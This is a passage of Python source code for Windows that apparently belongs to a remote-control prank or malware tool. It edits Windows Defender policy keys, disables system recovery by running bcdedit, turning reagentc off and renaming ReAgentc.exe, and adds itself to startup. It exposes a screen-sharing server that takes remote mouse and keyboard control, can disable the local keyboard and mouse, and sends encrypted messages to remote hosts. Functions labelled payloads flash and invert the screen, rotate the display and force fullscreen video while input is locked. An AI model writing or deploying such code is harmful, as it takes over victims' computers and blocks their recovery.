        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
    except Exception as e: 
        print(e)
        return False

def disableresetoptions():
    """Disables various system reset options in Windows."""
    run_command_as_admin('reagentc.exe /disable')
    run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 1 /f')
    run_command_as_admin(r'bcdedit /set {default} recoveryenabled no')
    run_command_as_admin(r'bcdedit /set {default} bootmenupolicy legacy')
    run_command_as_admin('takeown /f ReAgentc.exe')
    run_command_as_admin('icacls "C:\\Windows\\system32\\ReAgentc.exe" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im ReAgentc.exe')
    slp(0.5)
    run_command_as_admin('ren "C:\\Windows\\system32\\ReAgentc.exe" tmpreagentc.exe')
    
def enableresetoptions():
    """Enables various system reset options in Windows."""
    run_command_as_admin('reagentc.exe /enable')
    run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 0 /f')
    run_command_as_admin(r'bcdedit /set {default} recoveryenabled yes')
    run_command_as_admin('takeown /f tmpreagentc.exe')
    run_command_as_admin('icacls "C:\\Windows\\system32\\tmpreagentc.exe" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im tmpreagentc.exe')
    slp(0.5)
    run_command_as_admin('ren "C:\\Windows\\system32\\tmpreagentc.exe" ReAgentc.exe')

def handle_tostart_sequences():
    """Handles startup routines, such as adding the script to startup."""
    self_tostartup()


def play_tone_fxphone(information):
    """Plays a tone based on the given information string."""
    information = information.lower()
    frequency, duration = information.split('o1wgi0ks52i40l3')
    play_tone(int(frequency), int(duration))

def insend(serverip, msg):
    """Sends an encrypted message to a specified server IP address.

    Args:
        serverip (str): The IP address of the server.
        msg (str): The message to send.
    """
    toConnect = None
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(3)
        if isinstance(serverip, tuple):
            toConnect = serverip
        elif ":" in serverip:
            server2, port = serverip.split(':')
            toConnect = (server2, int(port))
        else:
            server2 = serverip
            port = vary_PORT
            toConnect = (server2, int(port))
        client.connect(toConnect)

        TUTKEYPHONE = 'placeholderkey'

        def encrypt(key, plaintext):
            """Encrypts the plaintext using AES."""
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return (cipher.nonce, tag, ciphertext)

        def decrypt(key, ciphertext):
            """Decrypts the ciphertext using AES."""
            (nonce, tag, ciphertext) = ciphertext
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt(ciphertext)
            try:
                cipher.verify(tag)
                return plaintext.decode("utf-8")
            except ValueError:
                return None

        message = (encrypt(TUTKEYPHONE, msg.encode("utf-8")))
        message = str(message).encode('utf-8')
        message = bytes(message)
        msg_length = len(message)
        send_length = str(msg_length).encode('utf-8')
        send_length += b' ' * (64 - len(send_length))
        client.send(send_length)
        client.send(message)
        client.close()
        print(f'Successfully sent {msg}, to client {serverip}')
    except TimeoutError as e:
        if toConnect is not None:
            print('Removing timed out connection,', toConnect)
        if isinstance(toConnect, tuple):
            ip, port = toConnect
            if f'{ip}:{port}' in varyhosts:
                varyhosts.remove(f'{ip}:{port}')
    except Exception as e:
        print(f'Error insend(timeout): {e}')

def send(serverip, text):
    """Sends a message to a specified server IP address."""
    insend(serverip, text)

def extract_value(input_str, start_delimiter):
    """Extracts a numerical value from a string based on a delimiter."""
    pattern = re.compile(rf'{re.escape(start_delimiter)}(\d+)(?:\s|$)')
    match = pattern.search(input_str)
    if match:
        return match.group(1)
    return None

def capture_screen():
    """Captures a screenshot of the current screen."""
    try:
        screenshot = pyautogui.screenshot()
        return np.array(screenshot)
    except Exception as e:
        return create_error_image(str(e))

def create_error_image(error_message):
    """Creates an error image with the given error message."""
    img = Image.new('RGB', (800, 600), color='black')
    d = ImageDraw.Draw(img)
    d.text((10, 10), f"Screen grab failed: {error_message}", fill=(255, 255, 255))
    return np.array(img)

def compare_images(img1, img2):
    """Compares two images and returns the difference and a boolean indicating s."""
    diff = cv2.absdiff(img1, img2)
    return diff, np.any(diff != 0)

def send_screen_diff(conn, diff, full_image):
    """Sends the difference between two images over a socket connection."""
    try:
        img = Image.fromarray(diff)
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        is_full_image = b'1' if np.array_equal(diff, full_image) else b'0'
        conn.send(is_full_image)
        conn.send(len(img_byte_arr).to_bytes(4, byteorder='big'))
        conn.send(img_byte_arr)
    except Exception as e:
        print(f"Error sending screen diff: {e}")

def process_command(conn, command):
    """Processes a command received over a socket connection."""
    global control_enabled, overwrite_enabled
    try:
        if command == "DISCONNECT":
            raise ConnectionResetError("Client disconnected")
        elif command == "ENABLE_CONTROL":
            control_enabled = True
            print("Control enabled")
        elif command == "DISABLE_CONTROL":
            control_enabled = False
            print("Control disabled")
        elif command == "ENABLE_OVERWRITE":
            overwrite_enabled = True
            print("Overwrite enabled")
        elif command == "DISABLE_OVERWRITE":
            overwrite_enabled = False
            print("Overwrite disabled")
        elif command.startswith("MOUSE"):
            if control_enabled and not (overwrite_enabled and pyautogui.onScreen(*pyautogui.position())):
                _, x, y = command.split(',')
                pyautogui.moveTo(int(x), int(y))
        elif command.startswith("CLICK"):
            if control_enabled and not (overwrite_enabled and pyautogui.onScreen(*pyautogui.position())):
                _, button, state = command.split(',')[:3]
                if state == "down":
                    pyautogui.mouseDown(button=button)
                elif state == "up":
                    pyautogui.mouseUp(button=button)
                else:
                    pyautogui.click(button=button)
        elif command.startswith("KEY"):
            if control_enabled and not overwrite_enabled:
                keys = command.split(',')[1:]
                for key in keys:
                    pyautogui.keyDown(key)
                for key in keys:
                    pyautogui.keyUp(key)
        elif command == "Disable keyboard":
            print("Keyboard disabled")
            disable_keyboard()
        elif command == "Disable mouse":
            disable_mouse()
            print("Mouse disabled")
        elif command == "Enable keyboard":
            enable_keyboard()
            print("Keyboard enabled")
        elif command == "Enable mouse":
            enable_mouse()
            print("Mouse enabled")
        elif command == "PING":
            conn.send(b"PONG")
    except ConnectionResetError as e:
        print(f"Connection closed: {e}")
        return 'close'
    except Exception as e:
        print(f"Error processing command: {e}")

def screensharing_server():
    """Starts a server for screen sharing."""
    socket.timeout(10000) 
    host = socket.gethostbyname(socket.gethostname())
    port = 53074
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    server_socket.settimeout(10000) 
    print(f"SS: Listening on {host}:{port}")
    global control_enabled
    control_enabled = False
    global overwrite_enabled
    overwrite_enabled = False
    while True:
        try:
            conn, addr = server_socket.accept()
            print(f"Connected by {addr}")
            conn.send(b"Request accepted")
            screen_size = pyautogui.size()
            conn.send(f"{screen_size.width},{screen_size.height}".encode())
            previous_screen = None
            while True:
                try:
                    ready_to_read, _, _ = select.select([conn], [], [], 0.05)
                    if ready_to_read:
                        data = conn.recv(1024).decode()
                        if not data:
                            raise ConnectionResetError("Client disconnected") 
                        commands = data.split(COMMAND_DELIMITER)
                        for command in commands:
                            if command: 
                                toclose = process_command(conn, command)
                                if toclose == 'close':
                                    raise ConnectionResetError("Client disconnected")
                    current_screen = capture_screen()
                    if previous_screen is None:
                        send_screen_diff(conn, current_screen, current_screen)
                    else:
                        diff, has_changes = compare_images(previous_screen, current_screen)
                        if has_changes:
                            send_screen_diff(conn, current_screen, current_screen)
                    previous_screen = current_screen
                except ConnectionResetError:
                    print("Connection closed")
                    break
                except Exception as e:
                    print(f"Error in main loop: {e}")
                    traceback.print_exc()
                    if isinstance(e, socket.error):
                        break 
        except Exception as e:
            print(f"Error in connection handling: {e}")
            traceback.print_exc()
        finally:
            if 'conn' in locals():
                conn.close()
    server_socket.close()

def host_ss(client_device_ipport):
    """Starts a server to host a screen sharing session.

    Args:
        client_device_ipport (tuple): The IP address and port of the client device.
    """
    global running_ss
    running_ss = True
    try:
        screensharing_server() 
    except Exception as e:
        print(f"Fatal error in screen sharing: {e}")
        traceback.print_exc()
    finally:
        running_ss = False

def remote_desktop_client(ip_address, port=53074):
    """Starts a client for remote desktop control.

    Args:
        ip_address (str): The IP address of the server.
        port (int, optional): The port number. Defaults to 53074.
    """
    root = tk.Tk()
    client = RemoteDesktopClient(root, ip_address, port)
    root.bind("<Motion>", client.send_mouse_event)
    root.bind("<Button-1>", client.send_click_event)
    root.bind("<Button-2>", client.send_click_event)
    root.bind("<Button-3>", client.send_click_event)
    root.bind("<ButtonRelease-1>", client.send_release_event)
    root.bind("<ButtonRelease-2>", client.send_release_event)
    root.bind("<ButtonRelease-3>", client.send_release_event)
    root.bind("<Key>", client.send_key_event)
    root.mainloop()

class RemoteDesktopClient:
    """Client for remote desktop control."""
    def __init__(self, master, ip_address, port):
        self.master = master
        self.ip_address = ip_address
        self.port = port
        master.title("Remote Desktop Client")
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TButton', background='#2a2a2a', foreground='white')
        self.style.configure('TCheckbutton', background='#1e1e1e', foreground='white')
        self.style.configure('TEntry', fieldbackground='#2a2a2a', foreground='white')
        self.style.configure('TScale', background='#1e1e1e', troughcolor='#2a2a2a')
        self.frame = ttk.Frame(master, padding="10")
        self.frame.pack(fill=tk.BOTH, expand=True)
        self.canvas = tk.Canvas(self.frame, bg='black')
        self.canvas.pack(fill=tk.BOTH, expand=True)
        control_frame = ttk.Frame(self.frame)
        control_frame.pack(fill=tk.X, pady=10)
        self.ip_label = ttk.Label(control_frame, text=f"Host IP: {self.ip_address}")
        self.ip_label.pack(side=tk.LEFT, padx=5)
        self.connect_button = ttk.Button(control_frame, text="Connect", command=self.connect)
        self.connect_button.pack(side=tk.LEFT, padx=5)
        self.disconnect_button = ttk.Button(control_frame, text="Disconnect", command=self.disconnect, state=tk.DISABLED)
        self.disconnect_button.pack(side=tk.LEFT, padx=5)
        self.control_var = tk.BooleanVar()
        self.control_checkbox = ttk.Checkbutton(control_frame, text="Enable Control", variable=self.control_var, command=self.toggle_control)
        self.control_checkbox.pack(side=tk.LEFT, padx=5)
        self.scale_var = tk.DoubleVar(value=1.0)
        self.scale_slider = ttk.Scale(control_frame, from_=0.1, to=2.0, orient=tk.HORIZONTAL, variable=self.scale_var, command=self.update_scale)
        self.scale_slider.pack(side=tk.LEFT, padx=5)
        self.scale_label = ttk.Label(control_frame, text="Scale: 1.0x")
        self.scale_label.pack(side=tk.LEFT, padx=5)
        self.control_options = ["Disable keyboard", "Disable mouse", "Enable keyboard", "Enable mouse"]
        self.control_dropdown = ttk.Combobox(control_frame, values=self.control_options, state="readonly")
        self.control_dropdown.pack(side=tk.LEFT, padx=5)
        self.control_dropdown.set(self.control_options[0])
        self.send_event_button = ttk.Button(control_frame, text="Send Event", command=self.send_control_event)
        self.send_event_button.pack(side=tk.LEFT, padx=5)
        self.connection_status_label = ttk.Label(control_frame, text="Connection Status: Disconnected (Ping: N/A)")
        self.connection_status_label.pack(side=tk.RIGHT, padx=5)
        self.socket = None
        self.connected = False
        self.host_screen_size = (0, 0)
        self.scale_factor = 1.0
        self.current_image = None
        self.master.bind("<Configure>", self.on_resize)
        self.last_mouse_position = (0, 0)
        self.mouse_update_interval = 0.05
        self.last_mouse_update_time = 0

    def connect(self):
        """Attempts to connect to the remote server."""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(5)
        try:
            self.socket.connect((self.ip_address, self.port))
            response = self.socket.recv(1024).decode()
            if response == "Request accepted":
                self.connected = True
                self.connect_button.config(state=tk.DISABLED)
                self.disconnect_button.config(state=tk.NORMAL)
                size_data = self.socket.recv(1024).decode().split(',')
                self.host_screen_size = (int(size_data[0]), int(size_data[1]))
                self.update_scale()
                self.update_connection_status("Connection Stable")
                threading.Thread(target=self.receive_screen, daemon=True).start()
        except socket.timeout:
            self.update_connection_status("Connection Failed: Timeout")
            messagebox.showerror("Connection Error", "Connection timed out")
        except Exception as e:
            self.update_connection_status("Connection Failed")
            messagebox.showerror("Connection Error", str(e))

    def disconnect(self):
        """Disconnects from the remote server."""
        if self.connected:
            try:
                self.socket.send(f"DISCONNECT{COMMAND_DELIMITER}".encode())
                self.socket.close()
            except:
                pass
            finally:
                self.connected = False
                self.connect_button.config(state=tk.NORMAL)
                self.disconnect_button.config(state=tk.DISABLED)
                self.update_connection_status("Disconnected")

    def update_connection_status(self, status, ping=None):
        """Updates the connection status label."""
        ping_str = f"Ping: {ping:.2f}ms" if ping is not None else "Ping: N/A"
        self.connection_status_label.config(text=f"Connection Status: {status} ({ping_str})")

    def toggle_control(self):
        """Toggles remote control on or off."""
        if self.connected:
            if self.control_var.get():
                self.socket.send(f"ENABLE_CONTROL{COMMAND_DELIMITER}".encode())
            else:
                self.socket.send(f"DISABLE_CONTROL{COMMAND_DELIMITER}".encode())

    def send_control_event(self):
        """Sends a control event to the server."""
        if self.connected:
            event = self.control_dropdown.get()
            self.socket.send(f"{event}{COMMAND_DELIMITER}".encode())

    def update_scale(self, *args):
        """Updates the display scale factor."""
        self.scale_factor = self.scale_var.get()
        self.scale_label.config(text=f"Scale: {self.scale_factor:.1f}x")
        self.resize_image()

    def resize_image(self):
        """Resizes the displayed image based on the scale factor."""
        if self.current_image:
            scaled_size = (int(self.host_screen_size[0] * self.scale_factor),
                           int(self.host_screen_size[1] * self.scale_factor))
            resized_image = self.current_image.resize(scaled_size, Image.LANCZOS)
            self.display_image(resized_image)

    def on_resize(self, event=None):
        """Handles window resize events."""
        if self.current_image:
            self.resize_image()
            self.master.geometry("")

    def receive_screen(self):
        """Continuously receives screen updates from the server."""
        while self.connected:
            try:
                self.socket.settimeout(5) 
                is_full_image = self.socket.recv(1) == b'1'
                size = int.from_bytes(self.socket.recv(4), byteorder='big')
                img_data = b''
                while len(img_data) < size:
                    chunk = self.socket.recv(size - len(img_data))
                    if not chunk:
                        raise RuntimeError("socket connection broken")
                    img_data += chunk
                image = Image.open(io.BytesIO(img_data))
                self.current_image = image
                self.resize_image()
                self.update_connection_status("Connection Stable")
            except socket.timeout:
                self.update_connection_status("Connection Weak")
            except Exception as e:
                print(f"Error receiving screen: {e}")
                traceback.print_exc()
                self.update_connection_status("Connection Failed")
                self.disconnect()
                break

    def display_image(self, image):
        """Displays the received image on the canvas."""
        photo = ImageTk.PhotoImage(image)
        self.canvas.delete("all")
        self.canvas.config(width=image.width, height=image.height)
        self.canvas.create_image(0, 0, anchor=tk.NW, image=photo)
        self.canvas.image = photo

    def send_mouse_event(self, event):
        """Sends mouse movement events to the server."""
        if self.connected and self.control_var.get():
            current_time = time.time()
            if current_time - self.last_mouse_update_time >= self.mouse_update_interval:
                x = int(event.x / self.scale_factor)
                y = int(event.y / self.scale_factor)
                self.socket.send(f"MOUSE,{x},{y}{COMMAND_DELIMITER}".encode())
                self.last_mouse_update_time = current_time
                self.last_mouse_position = (x, y)

    def send_click_event(self, event):
        """Sends mouse click events to the server."""
        if self.connected and self.control_var.get():
            x, y = self.last_mouse_position
            button = "left"
            if event.num == 2:
                button = "middle"
            elif event.num == 3:
                button = "right"
            self.socket.send(f"CLICK,{button},down,{x},{y}{COMMAND_DELIMITER}".encode())

    def send_release_event(self, event):
        """Sends mouse release events to the server."""
        if self.connected and self.control_var.get():
            x, y = self.last_mouse_position
            button = "left"
            if event.num == 2:
                button = "middle"
            elif event.num == 3:
                button = "right"
            self.socket.send(f"CLICK,{button},up,{x},{y}{COMMAND_DELIMITER}".encode())

    def send_key_event(self, event):
        """Sends keyboard events to the server."""
        if self.connected and self.control_var.get():
            key = event.char
            if not key:
                key = event.keysym 
            key_state = "down" if event.type == '2' else "up"
            self.socket.send(f"KEY,{key},{key_state}{COMMAND_DELIMITER}".encode())

def client_ss(ip):
    """Connects to the screen sharing server at the specified IP address.

    Args:
        ip (str): The IP address of the server.
    """
    remote_desktop_client(ip, 53074)

def play_tone(frequency, duration):
    """Plays a tone at the specified frequency and duration.

    Args:
        frequency (int): The frequency of the tone in Hertz.
        duration (int): The duration of the tone in milliseconds.
    """
    print(f'Playing {frequency}hz for a duration of {duration}')
    winsound.Beep(frequency, duration)

def play_shepard_tone(start_hz, end_hz, duration):
    """Plays a Shepard tone."""
    samples_per_second = 44100
    t = np.linspace(0, duration, int(samples_per_second * duration), False)
    f = start_hz * np.power(end_hz/start_hz, t/duration)
    wave = 0.5 * np.sin(2*np.pi*f*t)
    info = sd.query_devices()
    device_id = None
    for i, device in enumerate(info):
        if device['max_output_channels'] > 0:
            device_id = i
            break
    if device_id is not None:
        sd.play(wave, samples_per_second, device=device_id)
        sd.wait()
    else:
        print('No available output device found')

def check_vary_running():
    """Draws two black boxes bottom right and top left to indicate that this program is running"""
    # Get the screen dimensions
    x = win32api.GetSystemMetrics(0)  # width
    y = win32api.GetSystemMetrics(1)  # height

    # Create a device context
    desk = win32gui.GetDC(0)

    # Define the dimensions and positions of the boxes
    box_size = 100  # Size of the boxes

    # Draw the top-left box
    win32gui.FillRect(desk, (0, 0, box_size, box_size), win32gui.GetStockObject(win32con.BLACK_BRUSH))

    # Draw the bottom-right box
    win32gui.FillRect(desk, (x - box_size, y - box_size, x, y), win32gui.GetStockObject(win32con.BLACK_BRUSH))


def payload_1():
    """Executes a visual and audio payload."""
    desk = win32gui.GetDC(0)
    x = win32api.GetSystemMetrics(0)
    y = win32api.GetSystemMetrics(1)
    for i in range(30):
        win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
        winsound.Beep(440, 50)
        win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
        winsound.Beep(220, 50)
        win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
        winsound.Beep(660, 50)
        time.sleep(10)
    win32gui.ReleaseDC(desk, win32gui.GetDesktopWindow())
    win32gui.DeleteDC(desk)

def payload_2():
    """Executes a visual and audio payload."""
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)

    def asidjhb():
        """Plays a Shepard tone."""
        play_shepard_tone(100, 1000, 6)

    threading.Thread(target=asidjhb).start()

    def flash():
        """Flashes the screen."""
        for _ in range(100):
            dc = GetDC(0)
            BitBlt(dc, 0, 0, x, y, dc, 0, 0, NOTSRCCOPY)
            DeleteDC(dc)
            time.sleep(1)

    def invert_once():
        """Inverts the screen colors."""
        dc = GetDC(0)
        BitBlt(dc, 0, 0, x, y, dc, 0, 0, NOTSRCCOPY)
        DeleteDC(dc)

    def tunnel():
        """Creates a tunnel effect on the screen."""
        dc = GetDC(0)
        StretchBlt(dc, 0, 0, x, y, dc, -20, -20, x+40, y+40, SRCCOPY)
        DeleteDC(dc)

    def draw_icons():
        """Draws random icons on the screen."""
        dc = GetDC(0)
        IconWarning = LoadIcon(None, IDI_WARNING)
        IconError = LoadIcon(None, IDI_ERROR)
        DrawIcon(dc, random.randrange(x), random.randrange(y), random.choice([IconError, IconWarning]))
        DrawIcon(dc, random.randrange(x), random.randrange(y), random.choice([IconError, IconWarning]))
        DeleteDC(dc)

    for i in range(80):
        time.sleep(30)
        tunnel()
        draw_icons()
        if i % 3 == 0:
            invert_once()

def payload_3():
    """Draws random shapes on the screen with random colors and sounds."""
    hdc = win32gui.GetDC(0)
    pen_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
    pen = win32gui.CreatePen(win32con.PS_SOLID, 1, pen_color)
    brush_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
    brush = win32gui.CreateSolidBrush(brush_color)
    win32gui.SelectObject(hdc, pen)
    win32gui.SelectObject(hdc, brush)
    screen_width = win32api.GetSystemMetrics(0)
    screen_height = win32api.GetSystemMetrics(1)
    timeout = 8
    timeout_start = time.time()
    while time.time() < timeout_start + timeout:
        x = randint(0, screen_width)
        y = randint(0, screen_height)
        width = randint(10, screen_width // 10)
        height = randint(10, screen_height // 10)
        if randint(0, 1) == 0:
            win32gui.Ellipse(hdc, x, y, x + width, y + height)
        else:
            win32gui.Rectangle(hdc, x, y, x + width, y + height)
        pen_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
        pen = win32gui.CreatePen(win32con.PS_SOLID, 1, pen_color)
        brush_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
        brush = win32gui.CreateSolidBrush(brush_color)
        win32gui.SelectObject(hdc, pen)
        win32gui.SelectObject(hdc, brush)
        play_tone(1000, 10)
        slp(0.01)

def find_window(search_term):
    def callback(hwnd, windows):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            window_title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            try:
                process = psutil.Process(pid)
                if (search_term.lower() in window_title.lower() or 
                    search_term.lower() in process.name().lower()):
                    windows.append(hwnd)
            except psutil.NoSuchProcess:
                pass
        return True

    windows = []
    win32gui.EnumWindows(callback, windows)
    return windows

def bring_window_to_foreground(search_term):
    windows = find_window(search_term)
    if windows:
        hwnd = windows[0]  # Use the first matching window
        shell = win32com.client.Dispatch("WScript.Shell")
        shell.SendKeys('%')  # Alt key to activate the window
        win32gui.SetForegroundWindow(hwnd)
        print(f"Brought window matching '{search_term}' to foreground")
    else:
        print(f"No visible window found matching '{search_term}'")

def makethescreendorotations(duration):
    """Rotates the screen continuously for a specified duration."""
    duration = int(duration)
    screen = rotatescreen.get_primary_display()
    start_pos = screen.current_orientation
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        i += 1
        pos = abs((start_pos - i * 90) % 360)
        screen.rotate_to(pos)
        slp(0.7)
    screen.set_landscape()

def flipscreen():
    """Flips the screen upside down."""
    for i in rotatescreen.get_displays():
        i.set_landscape_flipped()

def screenlandscape():
    """Sets the screen orientation to landscape."""
    for i in rotatescreen.get_displays():
        i.set_landscape()

def screenportrait():
    """Sets the screen orientation to portrait (left)."""
    for i in rotatescreen.get_displays():
        i.set_portrait()

def screenportraitflipped():
    """Sets the screen orientation to portrait flipped (right)."""
    for i in rotatescreen.get_displays():
        i.set_portrait_flipped()

def chrome_window_control_maximize():
    def callback(hwnd, windows):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            try:
                process = psutil.Process(pid)
                if process.name().lower() == "chrome.exe":
                    title = win32gui.GetWindowText(hwnd)
                    if title and title.strip():  # Ignore empty or whitespace-only titles
                        windows.append((hwnd, title))
            except psutil.NoSuchProcess:
                pass
        return True

    windows = []
    win32gui.EnumWindows(callback, windows)
    chrome_windows = windows
    if not chrome_windows:
        print("No Chrome windows found with non-empty titles.")
        return

    for hwnd, title in chrome_windows:
        win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.SetForegroundWindow(hwnd)
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
        win32gui.SetForegroundWindow(hwnd)
        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, 
                                win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        shell = win32com.client.Dispatch("WScript.Shell")
        shell.SendKeys('%')  # Alt key to activate the window
        win32gui.SetForegroundWindow(hwnd)
    
        print(f"Actions performed on Chrome window: {title}")

def playYTvidfullscreen(video_url, starttime=None, endingtime=None):
    """Plays a YouTube video in full screen."""

    try:
        if starttime == '':
            starttime = None
    except:
        starttime = None
    try:
        if endingtime == '':
            endingtime = None
    except:
        endingtime = None
        
    if not video_url:
        print("No video URL provided.")
        return
    print(f"Playing video in the Fullscreen, URL: {video_url}, Start: {starttime}, End: {endingtime}")
    def get_youtube_video_duration(video_url):
        """Gets the duration of a YouTube video."""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(video_url, headers=headers)
        if response.status_code != 200:
            raise Exception(f"Failed to load page: {response.status_code}")
        soup = BeautifulSoup(response.text, 'html.parser')
        scripts = soup.find_all('script')
        for script in scripts:
            if 'ytInitialPlayerResponse' in script.string if script.string else '':
                script_content = script.string
                break
        else:
            raise Exception("Couldn't find ytInitialPlayerResponse in the page")
        duration_match = re.search(r'"approxDurationMs":"(\d+)"', script_content)
        if not duration_match:
            raise Exception("Couldn't find video duration in the page")
        duration_ms = int(duration_match.group(1))
        duration_seconds = duration_ms / 1000
        return duration_seconds

    vid_length = math.floor(get_youtube_video_duration(video_url))
    print(f'Specified video length is: {vid_length}')
    
    if endingtime is not None and endingtime > vid_length:
        print("Ending time is more than the video time, error.")
        return False, "endingtime>vidlength"
    if starttime is not None and starttime > vid_length:
        print("Starting time is more than the video time, error.")
        return False, "starttime>vidlength"

    def tryandretryuntilwork(*args):
        """Retries a function call until it succeeds."""
        def run():
            return driver.execute_script(*args)
        while True:
            try:
                return run()
            except Exception as e:
                print(e)
                time.sleep(0.5)
                continue
                
    def skipadbutton():
        """Skips YouTube ads if present."""
        skip_button_exists = len(driver.find_elements(By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]')) > 0
        print(f'Does the skip button exist? {skip_button_exists}')
        if skip_button_exists:
            skip_button = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]'))
            )
            skip_button.click()

    def getcurrentYTtime():
        """Gets the current playback time of the YouTube video."""
        return tryandretryuntilwork("return arguments[0].currentTime", video)

    def play():
        """Plays the YouTube video."""
        tryandretryuntilwork("arguments[0].play()", video)
        print("Playing...")

    def pause():
        """Pauses the YouTube video."""
        tryandretryuntilwork("arguments[0].pause()", video)
        print("Pausing...")

    def detectifpause():
        """Checks if the YouTube video is paused."""
        return tryandretryuntilwork("return arguments[0].paused", video)

    def mute():
        """Mutes the YouTube video."""
        tryandretryuntilwork("arguments[0].muted = true", video)
        print("Muting...")

    def unmute():
        """Unmutes the YouTube video."""
        tryandretryuntilwork("arguments[0].muted = false", video)
        print("Unmuting...")

    def setytvolume(volume):
        """Sets the volume of the YouTube video."""
        if volume > 1:
            volume = volume / 100
        tryandretryuntilwork("arguments[0].volume = arguments[1]", video, volume)
        print("Changing volume...")


    webdriver_path = os.path.join(os.path.dirname(__file__), 'chromedriver')
    print(f'Webdriver location: {webdriver_path}')
    options = webdriver.ChromeOptions()
    options.add_argument("start-minimized")  # Start Chrome minimized
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    driver = webdriver.Chrome(options=options)
    disable_keyboard()
    disable_mouse()
    minimize_process_via_name('chrome.exe')
    driver.get(video_url)
    minimize_process_via_name('chrome.exe')
    wait = WebDriverWait(driver, 15)
    video = wait.until(EC.presence_of_element_located((By.TAG_NAME, "video")))

    driver_process = psutil.Process(driver.service.process.pid)
    chrome_pid = driver_process.pid
    print(f"Chrome PID: {chrome_pid}") # literally does not work in anything

    minimize_process_via_name('chrome.exe')

    def setYTtime(time):
        """Sets the playback time of the YouTube video."""
        tryandretryuntilwork("arguments[0].currentTime = arguments[1]", video, time)
        print("Changing playback time...")

    mute()
    minimize_process_via_name('chrome.exe')
    wait3sec = time.time() + 3
    while True:
        try:
